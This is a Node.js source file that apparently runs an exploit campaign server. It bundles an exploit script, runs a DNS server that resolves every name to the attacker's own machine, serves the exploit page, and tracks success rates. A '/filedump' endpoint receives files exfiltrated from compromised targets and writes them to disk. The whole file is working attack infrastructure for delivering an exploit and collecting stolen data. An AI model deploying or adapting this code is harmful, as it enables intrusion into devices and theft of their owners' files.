const fs = require('fs')
const path = require('path')

const browserify = require('browserify')
const watchify = require('watchify')
const dnsd = require('dnsd')
const ip = require('ip')
const express = require('express')
const bodyParser = require('body-parser')
const mkdirp = require('mkdirp')


// Build our exploit bundle

let b = browserify({
  entries: [ 'exploit/main.js'],
  cache: {},
  packageCache: {},
  plugin: [ watchify ]
})

b.on('update', bundle)
bundle()

function bundle() {
  b.bundle().pipe(fs.createWriteStream('exploit/bundle.js'))
}

// Spin up our DNS server
dnsd.createServer(function(req, res) {
  res.end(ip.address())
}).listen(53, '0.0.0.0')

// Web server
const app = express()
app.use(bodyParser.json())

app.get('/', function (req, res) {
  res.end(fs.readFileSync(path.resolve(__dirname, 'exploit/index.html')))
})

app.get('/bundle.js', function (req, res) {
  res.end(fs.readFileSync(path.resolve(__dirname, 'exploit/bundle.js')))
})

let failures = 0
let successes = 0

app.post('/log', function (req, res) {
  let message = req.body.msg

  if (message === 'Loaded') {
    console.log(`Success percentage: ${(successes / failures * 100).toFixed(2)} (${successes + failures} samples)`)
  } else if (message === '~~failed') {
    failures++
  } else if (message === '~~success') {
    successes++
  } else {
    console.log(`Log: ${message}`)
  }

  return res.sendStatus(200)
})

app.post('/error', function (req, res) {
  console.log(`ERR [${req.body.line}]: ${req.body.message}`)
  return res.sendStatus(200)
})

app.post('/filedump', function (req, res) {
  let name = req.get('Content-Disposition').replace(':', '')
  let dir = path.dirname(name)

  try {
    fs.statSync(dir)
  } catch (e) {
    mkdirp.sync(dir)
  }
  req.pipe(fs.createWriteStream(name, {
    defaultEncoding: 'binary',
    flags: 'a'
  }))

  return res.sendStatus(200)
})

app.listen(80, '0.0.0.0')


// Start our REPL
require('./debug')
